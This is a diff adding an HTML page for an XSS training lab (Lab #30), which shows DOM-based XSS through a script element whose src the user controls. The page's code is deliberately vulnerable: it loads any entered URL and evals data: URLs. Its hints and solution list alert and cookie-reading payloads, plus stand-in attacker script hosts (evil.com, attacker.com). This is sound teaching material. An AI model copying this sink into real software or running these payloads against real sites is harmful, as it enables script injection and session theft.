@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Lab #30: Dynamic &lt;script src&gt; with User Parameter</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #0f172a;
+            color: #e2e8f0;
+        }
+        .header {
+            text-align: center;
+            border-bottom: 2px solid #facc15;
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+        }
+        .header h1 { color: #facc15; }
+        .header a { color: #38bdf8; text-decoration: none; }
+        .lab-box {
+            background: #1e293b;
+            border-left: 5px solid #dc2626;
+            padding: 25px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .badge {
+            background: #dc2626;
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-bottom: 15px;
+        }
+        .output {
+            background: #0f172a;
+            border: 2px solid #dc2626;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+            min-height: 120px;
+        }
+        .info {
+            background: #0f172a;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        code {
+            background: #000;
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #facc15;
+        }
+        button {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            margin: 5px;
+        }
+        .btn-danger {
+            background: #dc2626;
+        }
+        .btn-success {
+            background: #10b981;
+        }
+        .btn-secondary {
+            background: #475569;
+        }
+        .solution {
+            background: #0f172a;
+            border: 1px solid #10b981;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            display: none;
+        }
+        .solution.show { display: block; }
+        input {
+            width: 100%;
+            background: #0f172a;
+            border: 1px solid #475569;
+            color: #e2e8f0;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 14px;
+            margin: 5px 0;
+        }
+        .alert-box {
+            background: #facc1520;
+            border-left: 3px solid #facc15;
+            padding: 10px;
+            margin: 10px 0;
+        }
+        .warning-box {
+            background: #dc262620;
+            border-left: 3px solid #dc2626;
+            padding: 10px;
+            margin: 10px 0;
+        }
+        .script-preview {
+            background: #0a0f1a;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            margin: 10px 0;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>XSS-Labs</h1>
+    <p>Created by <strong>Abhinav Singwal</strong> · <a href="https://github.com/yogsec">GitHub</a> · <a href="https://linktr.ee/abhinavsingwal">Linktree</a></p>
+    <p><a href="index.html" style="color: #facc15;">← Back to all labs</a></p>
+</div>
+
+<div class="lab-box">
+    <div class="badge">🔹 Lab #30 · DOM-Based XSS</div>
+    <h2>Dynamic &lt;script src&gt; with User Parameter</h2>
+    <p>Creating a <code>&lt;script&gt;</code> element with a user-controlled <code>src</code> attribute is EXTREMELY DANGEROUS - the remote script can execute any code!</p>
+
+    <div class="warning-box">
+        <strong>WARNING:</strong> Dynamically adding a script tag with user-controlled src allows attackers to load and execute remote malicious scripts!
+    </div>
+
+    <div class="alert-box">
+        <strong>TEST:</strong><br>
+        1. Enter a URL to a JavaScript file (or use our mock endpoint)<br>
+        2. Click "Load Script" → The script is executed<br>
+        3. Try the example payloads below
+    </div>
+
+    <div class="info">
+        <strong>Enter Script URL (src attribute):</strong>
+        <input type="text" id="scriptUrl" placeholder="https://example.com/malicious.js" value="">
+        <button id="loadScriptBtn" class="btn-danger">LOAD SCRIPT (createElement + src)</button>
+        <button id="clearScriptsBtn" class="btn-secondary">Remove All Scripts</button>
+    </div>
+
+    <div class="info">
+        <strong>Quick Payloads (click to test):</strong><br>
+        <button id="payload1" class="btn-danger">Inline script (data:text/javascript)</button>
+        <button id="payload2" class="btn-danger">Alert via data URL</button>
+        <button id="payload3" class="btn-danger">Alert cookie via data URL</button>
+        <button id="payload4" class="btn-danger">Blob URL script</button>
+    </div>
+
+    <div class="info">
+        <strong>📋 Loaded Scripts:</strong>
+        <div id="scriptsList" class="script-preview" style="min-height: 80px;">
+            <span style="color:#64748b">No scripts loaded yet</span>
+        </div>
+    </div>
+
+    <div class="output" id="resultOutput">
+        <span>Enter a script URL or click a payload button above.</span>
+    </div>
+
+    <div class="info" style="background: #dc262620;">
+        <strong>HOW DYNAMIC SCRIPT INJECTION WORKS:</strong><br>
+        • <code>document.createElement('script')</code> creates a new script element<br>
+        • Setting <code>script.src = userInput</code> loads and executes remote code<br>
+        • Attackers can host malicious JS on their own server<br>
+        • <strong>NEVER let users control script src attributes!</strong>
+    </div>
+
+    <details style="margin: 15px 0;">
+        <summary style="cursor: pointer; color: #facc15;">Hints</summary>
+        <ul>
+            <li><code>data:text/javascript,alert('XSS')</code> - Inline script via data URL</li>
+            <li><code>https://evil.com/malicious.js</code> - Remote malicious script</li>
+            <li>The loaded script has full access to your page (DOM, cookies, etc.)</li>
+        </ul>
+    </details>
+
+    <button id="solutionBtn">Show Solution</button>
+    
+    <div id="solutionPanel" class="solution">
+        <h3>Solution</h3>
+        <p><strong>Working Payloads (script URLs):</strong></p>
+        <ul>
+            <li><code>data:text/javascript,alert('XSS')</code> - Inline JavaScript via data URL</li>
+            <li><code>data:text/javascript,alert(document.cookie)</code> - Steal cookies</li>
+            <li><code>https://attacker.com/xss.js</code> - Remote malicious script</li>
+            <li><code>blob:... </code> - Blob URL containing malicious code</li>
+        </ul>
+        <p><strong>Vulnerable Code:</strong></p>
+        <pre style="background:#000; padding:10px; border-radius:5px; overflow-x:auto;">let scriptUrl = document.getElementById('urlInput').value;
+let script = document.createElement('script');
+script.src = scriptUrl;
+document.body.appendChild(script);  // Executes remote code!</pre>
+        <p><strong>Real-world attack scenario:</strong></p>
+        <pre style="background:#000; padding:10px; border-radius:5px; overflow-x:auto;">// Attacker-controlled parameter
+let userLib = location.search.split('lib=')[1];
+let script = document.createElement('script');
+script.src = userLib;  // Could be https://evil.com/xss.js
+document.head.appendChild(script);</pre>
+        <p><strong>Fix:</strong> Validate and sanitize script URLs. Better yet, never let users control script sources.</p>
+    </div>
+</div>
+
+<script>
+    var scriptsList = document.getElementById('scriptsList');
+    var resultOutput = document.getElementById('resultOutput');
+    var scriptUrlInput = document.getElementById('scriptUrl');
+    var loadScriptBtn = document.getElementById('loadScriptBtn');
+    var clearScriptsBtn = document.getElementById('clearScriptsBtn');
+    var solutionBtn = document.getElementById('solutionBtn');
+    var solutionPanel = document.getElementById('solutionPanel');
+
+    var loadedScripts = [];
+    var scriptCounter = 0;
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    function updateScriptsList() {
+        if (loadedScripts.length === 0) {
+            scriptsList.innerHTML = '<span style="color:#64748b">No scripts loaded yet</span>';
+            return;
+        }
+        
+        var html = '';
+        for (var i = 0; i < loadedScripts.length; i++) {
+            html += '<div style="margin-bottom: 5px; padding: 5px; background: #1e293b; border-radius: 3px;"><strong>Script ' + (i+1) + ':</strong> <code>' + escapeHtml(loadedScripts[i]) + '</code></div>';
+        }
+        scriptsList.innerHTML = html;
+    }
+
+    // VULNERABLE FUNCTION - Dynamically adding script with user-controlled src
+    function loadScript(src) {
+        if (!src || src.trim() === '') {
+            resultOutput.innerHTML = '<span>Please enter a script URL.</span>';
+            return false;
+        }
+        
+        scriptCounter++;
+        loadedScripts.push(src);
+        updateScriptsList();
+        
+        resultOutput.innerHTML = '<span style="color:#facc15;">Loading script from URL:</span><br><code style="display:block; margin-top:10px; background:#000; padding:10px; border-radius:5px; overflow-x:auto;">' + escapeHtml(src) + '</code><div style="margin-top:10px; font-size:12px; color:#ef4444;">⚠️ Script tag created with src = user-controlled value!</div><div style="margin-top:5px; font-size:10px;">Scripts loaded: ' + scriptCounter + '</div>';
+        
+        // EXTREMELY VULNERABLE SINK
+        // Creating script tag with user-controlled src - loads and executes remote code!
+        try {
+            var script = document.createElement('script');
+            
+            // For data: URLs, we need to handle them specially
+            if (src.toLowerCase().startsWith('data:text/javascript')) {
+                // data: URLs contain the code directly
+                var code = src.substring(src.indexOf(',') + 1);
+                resultOutput.innerHTML += '<div style="margin-top:10px; color:#f59e0b;">data: URL detected - executing inline script...</div>';
+                try {
+                    eval(decodeURIComponent(code));
+                } catch(e) {
+                    resultOutput.innerHTML += '<div style="margin-top:10px; color:#f59e0b;">Error: ' + escapeHtml(e.message) + '</div>';
+                }
+            } else {
+                // Normal script loading
+                script.src = src;
+                script.onerror = function() {
+                    resultOutput.innerHTML += '<div style="margin-top:10px; color:#f59e0b;">Error loading script from: ' + escapeHtml(src) + '</div>';
+                };
+                document.head.appendChild(script);
+                resultOutput.innerHTML += '<div style="margin-top:10px; color:#10b981;">Script tag added to document.head</div>';
+            }
+        } catch(e) {
+            resultOutput.innerHTML += '<div style="margin-top:10px; color:#f59e0b;">Error: ' + escapeHtml(e.message) + '</div>';
+            return false;
+        }
+        return true;
+    }
+
+    function loadFromInput() {
+        var url = scriptUrlInput.value.trim();
+        if (url) {
+            loadScript(url);
+        } else {
+            resultOutput.innerHTML = '<span>Please enter a script URL.</span>';
+        }
+    }
+
+    function clearAllScripts() {
+        // Remove all dynamically added script tags
+        var scripts = document.querySelectorAll('script[data-dynamic="true"]');
+        for (var i = 0; i < scripts.length; i++) {
+            scripts[i].remove();
+        }
+        loadedScripts = [];
+        scriptCounter = 0;
+        updateScriptsList();
+        resultOutput.innerHTML = '<span>All dynamic scripts removed.</span>';
+    }
+
+    function setPayload(payload) {
+        scriptUrlInput.value = payload;
+        loadScript(payload);
+    }
+
+    // Create a blob URL with malicious code
+    function createBlobScript() {
+        var code = 'alert("XSS from Blob URL script!")';
+        var blob = new Blob([code], { type: 'text/javascript' });
+        var blobUrl = URL.createObjectURL(blob);
+        scriptUrlInput.value = blobUrl;
+        loadScript(blobUrl);
+        // Revoke after load? Not needed for demo
+    }
+
+    // Button handlers
+    loadScriptBtn.onclick = loadFromInput;
+    clearScriptsBtn.onclick = clearAllScripts;
+    
+    document.getElementById('payload1').onclick = function() { 
+        setPayload('data:text/javascript,alert("XSS from data: URL script!")'); 
+    };
+    document.getElementById('payload2').onclick = function() { 
+        setPayload('data:text/javascript,alert("XSS Alert from dynamic script!")'); 
+    };
+    document.getElementById('payload3').onclick = function() { 
+        setPayload('data:text/javascript,alert("Your cookies: " + document.cookie)'); 
+    };
+    document.getElementById('payload4').onclick = function() { 
+        createBlobScript(); 
+    };
+
+    // Enter key in input
+    scriptUrlInput.onkeypress = function(e) {
+        if (e.key === 'Enter') {
+            loadFromInput();
+        }
+    };
+
+    // Mark dynamically added scripts
+    var originalAppendChild = document.head.appendChild;
+    document.head.appendChild = function(element) {
+        if (element.tagName === 'SCRIPT') {
+            element.setAttribute('data-dynamic', 'true');
+        }
+        return originalAppendChild.call(this, element);
+    };
+
+    // Solution toggle
+    var visible = false;
+    solutionBtn.onclick = function() {
+        visible = !visible;
+        if (visible) {
+            solutionPanel.classList.add('show');
+            solutionBtn.textContent = 'Hide Solution';
+        } else {
+            solutionPanel.classList.remove('show');
+            solutionBtn.textContent = 'Show Solution';
+        }
+    };
+
+    // Set default example
+    scriptUrlInput.value = 'data:text/javascript,alert("XSS from dynamic script src!")';
+    
+    console.log('Lab #30 Ready - Dynamic <script src> XSS');
+    console.log('WARNING: Loading scripts from user-controlled URLs is extremely dangerous!');
+</script>
+</body>
+</html>
